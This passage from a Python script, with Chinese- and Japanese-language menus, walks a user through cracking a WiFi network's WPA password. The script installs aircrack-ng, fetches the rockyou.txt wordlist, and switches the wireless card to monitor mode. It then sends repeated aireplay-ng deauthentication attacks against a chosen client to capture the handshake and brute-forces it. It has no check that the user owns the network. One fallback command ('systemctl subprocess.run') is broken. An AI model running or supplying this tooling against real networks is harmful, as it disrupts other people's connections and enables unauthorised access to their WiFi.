                    elif "debian" in contenido or "ubuntu" in contenido:
                        return "基于 Debian/Ubuntu 的发行版", "4"
            except Exception:
                pass

            return None, None

        os_detectado, opcion_os = detectar_sistema_operativo()
        if os_detectado:
            print(f"\n检测到操作系统: {os_detectado}")
            respuesta_os = input("是否正确？(是/否): ").strip().lower()
            if respuesta_os != "是":
                os_detectado = None

        if not os_detectado:
            print("\n您使用什么操作系统？请选择数字：")
            print("1--> Arch Linux / Manjaro")
            print("2--> Fedora / RHEL / CentOS")
            print("3--> Fedora/RHEL/CentOS (旧版本)")
            print("4--> 基于 Debian/Ubuntu 的发行版")
            opcion_os = input("选项: ").strip()

        while True:
            print("\n是否已安装 aircrack-ng？(是/否)")
            respuesta_instalacion = input().strip().lower()

            if respuesta_instalacion == "否":
                if opcion_os == "1":
                    print("正在 Arch Linux/Manjaro 上安装...")
                    subprocess.run(["sudo", "pacman", "-Sy", "aircrack-ng", "--noconfirm"])
                elif opcion_os == "2":
                    print("正在 Fedora/RHEL/CentOS 上安装...")
                    subprocess.run(["sudo", "dnf", "install", "-y", "aircrack-ng"])
                elif opcion_os == "3":
                    print("正在旧版本上安装...")
                    subprocess.run(["sudo", "yum", "install", "-y", "aircrack-ng"])
                elif opcion_os == "4":
                    print("正在 Debian/Ubuntu 上安装...")
                    subprocess.run("sudo apt update && sudo apt install -y aircrack-ng", shell=True)
                break

            elif respuesta_instalacion == "是":
                break

        print("是否有密码字典文件？")
        print("是/否")
        decision_directorio = input().strip().lower()

        if decision_directorio == "否":
            subprocess.run(["sudo", "wget", "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"])
        else:
            print("好的，我们继续")

        while True:
            print("\n知道您的网卡名称吗？(是/否)")
            respuesta_tarjeta = input().strip().lower()

            if respuesta_tarjeta == "是":
                break
            elif respuesta_tarjeta == "否":
                print("\n显示网络接口...")
                subprocess.run(["ip", "a"])
                print("\n请找到 WiFi 接口（通常是 wlan0, wlp2s0 等）")
                time.sleep(2)

        print("\n请输入您的网卡名称（例如: wlan0）:")
        tarjeta = input().strip()

        print(f"\n正在将 {tarjeta} 设置为监控模式...")
        subprocess.run(["sudo", "airmon-ng", "check", "kill"])
        subprocess.run(["sudo", "airmon-ng", "start", tarjeta])

        print("\n正在扫描 WiFi 网络...")
        print("需要扫描多少秒？")
        try:
            tiempo_auditoria = int(input())
        except ValueError:
            print("错误：请输入有效数字")
            exit(1)

        proceso = subprocess.Popen(["sudo", "airodump-ng", f"{tarjeta}mon"])

        try:
            time.sleep(tiempo_auditoria)
        except KeyboardInterrupt:
            print("\n扫描已中断")
        finally:
            proceso.terminate()
            proceso.wait()
            subprocess.run(["sudo", "pkill", "airodump-ng"])

        print("\n是否继续？(是/否)")
        seguir_1 = input().strip().lower()

        if seguir_1 == "否":
            print("\n正在停止监控模式...")
            subprocess.run(["sudo", "airmon-ng", "stop", f"{tarjeta}mon"])
            print("监控模式已停止")
            print("您使用什么操作系统？")
            print("正在恢复网络连接...")
            if opcion_os == "1":
                print("正在 Arch Linux/Manjaro 上恢复 WiFi...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "subprocess.run"])
                exit()
            elif opcion_os == "2":
                print("正在 Fedora/RHEL/CentOS 上恢复...")
                subprocess.run(["sudo", "systemctl", "restart", "network-online.target"])
                exit()
            elif opcion_os == "3":
                print("正在旧版本上恢复...")
                subprocess.run(["sudo", "service", "network", "restart"])
                exit()
            elif opcion_os == "4":
                print("正在 Debian/Ubuntu 上恢复...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "restart", "networking"])
                exit()
            exit()
        if seguir_1 == "是":
            print("\n继续执行...")

        print("现在请输入网络数据")
        print("需要以下信息：")
        print("BSSID:")
        BSSID = input().strip()
        print("频道 (CH):")
        CH = input().strip()

        subprocess.run(["sudo", "iwconfig", f"{tarjeta}mon", "channel", CH])

        print("现在我将显示需要在另一个终端执行的命令来捕获握手包")
        print("首先请输入审计文件的名称：")
        nombre_auditoria = input().strip()
        print(f"\n命令是：\nsudo airodump-ng -c {CH} --bssid {BSSID} -w {nombre_auditoria} {tarjeta}mon")
        print("当有设备连接时，请输入该设备的 STATION")

        station = input("请输入 STATION (设备的 MAC 地址): ").strip()

        print("每次发送多少个请求？（推荐 9 个）")
        peticiones = input().strip()
        if not peticiones.isdigit():
            print("请求数量无效")
            exit(1)

        print("现在执行取消认证攻击吗？(是/否)")
        decision_desautentificacion1 = input().strip().lower()

        if decision_desautentificacion1 == "是":
            subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "-0", peticiones, "-a", BSSID, "-c", station, f"{tarjeta}mon"])
        elif decision_desautentificacion1 == "否":
            archivos = glob.glob(nombre_auditoria + "*")
            if archivos:
                subprocess.run(["sudo", "rm", "-f"] + archivos)
            exit()

        while True:
            print("再次发送攻击吗？(是/否)")
            decision = input().strip().lower()
            if decision == "是":
                subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "-0", peticiones, "-a", BSSID, "-c", station, f"{tarjeta}mon"])
            elif decision == "否":
                break

        print("很好，只剩最后一步了。")
        print("脚本是否已下载 rockyou.txt 字典文件？(是/否)")
        instalado = input().strip().lower()

        if instalado == "是":
            directorio = "rockyou.txt"
        else:
            directorio = input("请输入字典文件路径: ").strip()

        print("现在开始暴力破解密码吗？(是/否)")
        decision_final = input().strip().lower()

        if decision_final == "是":
            subprocess.run(["sudo", "aircrack-ng", "-b", BSSID, "-w", directorio, nombre_auditoria + "-01.cap"])
        else:
            archivos = glob.glob(nombre_auditoria + "*")
            if archivos:
                subprocess.run(["sudo", "rm", "-f"] + archivos)
            exit()
        if decision_final == "否":
            print("\n正在停止监控模式...")
            subprocess.run(["sudo", "airmon-ng", "stop", f"{tarjeta}mon"])
            print("监控模式已停止")
            print("您使用什么操作系统？")
            print("正在恢复网络连接...")
            if opcion_os == "1":
                print("正在 Arch Linux/Manjaro 上恢复 WiFi...")
                subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "2":
                print("正在 Fedora/RHEL/CentOS 上恢复...")
                subprocess.run(["sudo", "systemctl", "restart", "network-online.target"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "3":
                print("正在旧版本上恢复...")
                subprocess.run(["sudo", "service", "network", "restart"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "4":
                print("正在 Debian/Ubuntu 上恢复...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "restart", "networking"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
                                                                                                                            #japones
    elif idioma == "9":
        def detectar_sistema_operativo():
            try:
                resultado = subprocess.run(["lsb_release", "-d"], capture_output=True, text=True)
                if resultado.returncode == 0:
                    descripcion = resultado.stdout.lower()
                    if "arch" in descripcion or "manjaro" in descripcion:
                        return "Arch Linux / Manjaro", "1"
                    elif "fedora" in descripcion or "red hat" in descripcion or "rhel" in descripcion or "centos" in descripcion:
                        return "Fedora / RHEL / CentOS", "2"
                    elif "debian" in descripcion or "ubuntu" in descripcion:
                        return "Debian/Ubuntu系ディストリビューション", "4"
            except Exception:
                pass

            try:
                with open("/etc/os-release", "r") as f:
                    contenido = f.read().lower()
                    if "arch" in contenido or "manjaro" in contenido:
                        return "Arch Linux / Manjaro", "1"
                    elif "fedora" in contenido or "red hat" in contenido or "rhel" in contenido or "centos" in contenido:
                        return "Fedora / RHEL / CentOS", "2"
                    elif "debian" in contenido or "ubuntu" in contenido:
                        return "Debian/Ubuntu系ディストリビューション", "4"
            except Exception:
                pass

            return None, None

        os_detectado, opcion_os = detectar_sistema_operativo()
        if os_detectado:
            print(f"\n検出されたOS: {os_detectado}")
            respuesta_os = input("正しいですか？(はい/いいえ): ").strip().lower()
            if respuesta_os != "はい":
                os_detectado = None

        if not os_detectado:
            print("\n使用しているOSを選択してください:")
            print("1--> Arch Linux / Manjaro")
            print("2--> Fedora / RHEL / CentOS")
            print("3--> Fedora/RHEL/CentOS (旧バージョン)")
            print("4--> Debian/Ubuntu系ディストリビューション")
            opcion_os = input("選択肢: ").strip()

        while True:
            print("\naircrack-ngはインストールされていますか？(はい/いいえ)")
            respuesta_instalacion = input().strip().lower()

            if respuesta_instalacion == "いいえ":
                if opcion_os == "1":
                    print("Arch Linux/Manjaroにインストール中...")
                    subprocess.run(["sudo", "pacman", "-Sy", "aircrack-ng", "--noconfirm"])
                elif opcion_os == "2":
                    print("Fedora/RHEL/CentOSにインストール中...")
                    subprocess.run(["sudo", "dnf", "install", "-y", "aircrack-ng"])
                elif opcion_os == "3":
                    print("旧バージョンにインストール中...")
                    subprocess.run(["sudo", "yum", "install", "-y", "aircrack-ng"])
                elif opcion_os == "4":
                    print("Debian/Ubuntuにインストール中...")
                    subprocess.run("sudo apt update && sudo apt install -y aircrack-ng", shell=True)
                break

            elif respuesta_instalacion == "はい":
                break

        print("パスワードファイルはありますか？")
        print("はい/いいえ")
        decision_directorio = input().strip().lower()

        if decision_directorio == "いいえ":
            subprocess.run(["sudo", "wget", "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"])
        else:
            print("了解、続けます")

        while True:
            print("\nネットワークカードの名前を知っていますか？(はい/いいえ)")
            respuesta_tarjeta = input().strip().lower()

            if respuesta_tarjeta == "はい":
                break
            elif respuesta_tarjeta == "いいえ":
                print("\nネットワークインターフェースを表示中...")
                subprocess.run(["ip", "a"])
                print("\nWiFiインターフェースを確認してください（通常はwlan0, wlp2s0など）")
                time.sleep(2)

        print("\nネットワークカード名を入力してください（例: wlan0）:")
        tarjeta = input().strip()

        print(f"\n{tarjeta}をモニターモードに設定中...")
        subprocess.run(["sudo", "airmon-ng", "check", "kill"])
        subprocess.run(["sudo", "airmon-ng", "start", tarjeta])

        print("\nWiFiネットワークをスキャン中...")
        print("何秒間スキャンしますか？")
        try:
            tiempo_auditoria = int(input())
        except ValueError:
            print("エラー：有効な数字を入力してください")
            exit(1)

        proceso = subprocess.Popen(["sudo", "airodump-ng", f"{tarjeta}mon"])

        try:
            time.sleep(tiempo_auditoria)
        except KeyboardInterrupt:
            print("\nスキャンを中断しました")
        finally:
            proceso.terminate()
            proceso.wait()
            subprocess.run(["sudo", "pkill", "airodump-ng"])

        print("\n続行しますか？(はい/いいえ)")
        seguir_1 = input().strip().lower()

        if seguir_1 == "いいえ":
            print("\nモニターモードを停止中...")
            subprocess.run(["sudo", "airmon-ng", "stop", f"{tarjeta}mon"])
            print("モニターモードが停止しました")
            print("使用しているOSは何ですか？")
            print("ネットワーク接続を復元中...")
            if opcion_os == "1":
                print("Arch Linux/ManjaroでWiFiを復元中...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "subprocess.run"])
                exit()
            elif opcion_os == "2":
                print("Fedora/RHEL/CentOSで復元中...")
                subprocess.run(["sudo", "systemctl", "restart", "network-online.target"])
                exit()
            elif opcion_os == "3":
                print("旧バージョンで復元中...")
                subprocess.run(["sudo", "service", "network", "restart"])
                exit()
            elif opcion_os == "4":
                print("Debian/Ubuntuで復元中...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "restart", "networking"])
                exit()
            exit()
        if seguir_1 == "はい":
            print("\n処理を続行します...")

        print("ネットワーク情報を入力してください")
        print("以下の情報が必要です:")
        print("BSSID:")
        BSSID = input().strip()
        print("チャンネル (CH):")
        CH = input().strip()

        subprocess.run(["sudo", "iwconfig", f"{tarjeta}mon", "channel", CH])

        print("ハンドシェイクをキャプチャするためのコマンドを別のターミナルで実行してください")
        print("まず監査ファイルの名前を入力してください:")
        nombre_auditoria = input().strip()
        print(f"\nコマンド:\nsudo airodump-ng -c {CH} --bssid {BSSID} -w {nombre_auditoria} {tarjeta}mon")
        print("デバイスが接続したら、STATIONを入力してください")

        station = input("STATIONを入力してください（デバイスのMACアドレス）: ").strip()

        print("一度に送信するリクエスト数は？（推奨は9）")
        peticiones = input().strip()
        if not peticiones.isdigit():
            print("無効なリクエスト数です")
            exit(1)

        print("今すぐデオーセンティケーション攻撃を実行しますか？(はい/いいえ)")
        decision_desautentificacion1 = input().strip().lower()

        if decision_desautentificacion1 == "はい":
            subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "-0", peticiones, "-a", BSSID, "-c", station, f"{tarjeta}mon"])
        elif decision_desautentificacion1 == "いいえ":
            archivos = glob.glob(nombre_auditoria + "*")
            if archivos:
                subprocess.run(["sudo", "rm", "-f"] + archivos)
            exit()

        while True:
            print("再度攻撃を実行しますか？(はい/いいえ)")
            decision = input().strip().lower()
            if decision == "はい":
                subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "-0", peticiones, "-a", BSSID, "-c", station, f"{tarjeta}mon"])
            elif decision == "いいえ":
                break

        print("あと少しです。")
        print("rockyou.txt辞書ファイルはダウンロードされましたか？(はい/いいえ)")
        instalado = input().strip().lower()

        if instalado == "はい":
            directorio = "rockyou.txt"
        else:
            directorio = input("辞書ファイルのパスを入力してください: ").strip()

        print("今すぐブルートフォース攻撃を開始しますか？(はい/いいえ)")
        decision_final = input().strip().lower()

        if decision_final == "はい":
            subprocess.run(["sudo", "aircrack-ng", "-b", BSSID, "-w", directorio, nombre_auditoria + "-01.cap"])
        else:
            archivos = glob.glob(nombre_auditoria + "*")
            if archivos:
                subprocess.run(["sudo", "rm", "-f"] + archivos)
            exit()
        if decision_final == "いいえ":
            print("\nモニターモードを停止中...")
            subprocess.run(["sudo", "airmon-ng", "stop", f"{tarjeta}mon"])
            print("モニターモードが停止しました")
            print("使用しているOSは何ですか？")
            print("ネットワーク接続を復元中...")
            if opcion_os == "1":
                print("Arch Linux/ManjaroでWiFiを復元中...")
                subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "2":
                print("Fedora/RHEL/CentOSで復元中...")
                subprocess.run(["sudo", "systemctl", "restart", "network-online.target"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "3":
                print("旧バージョンで復元中...")
                subprocess.run(["sudo", "service", "network", "restart"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "4":
                print("Debian/Ubuntuで復元中...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "restart", "networking"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
if __name__ == "__main__":
    main()